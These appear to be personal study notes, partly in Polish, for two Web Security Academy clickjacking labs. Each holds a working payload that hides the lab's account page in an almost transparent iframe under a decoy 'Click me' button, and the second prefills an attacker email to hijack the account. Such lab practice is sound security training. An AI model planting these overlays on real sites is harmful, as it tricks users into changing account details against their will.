<br><br>
<hr>
<br><br>
<h2>Lab: Basic clickjacking with CSRF token protection</h2>

zalogowac sie na wiener:peter attacker


payload:

<style>
    iframe {
        position: relative;
        width: 500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position: absolute;
        top: 300px;
        left: 60px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a3a004d03b1045480f60331005e00c0.web-security-academy.net/my-account"></iframe>


<br><br>
<hr>
<br><br>
<h2>Lab: Clickjacking with form input data prefilled from a URL parameter</h2>

1.login

email ma być inny niż Twój aktualny adres w koncie.
Najpierw testuj z opacity: 0.1.
Jak przy Test me kursor zmienia się w rączkę nad Update email, wtedy zmień na:
Test me → Click me
opacity: 0.1 → 0.0001

<style>
    iframe {
        position: relative;
        width: 500px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position: absolute;
        top: 400px;
        left: 80px;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="https://0ae00071041bb57b80bde95900a300df.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
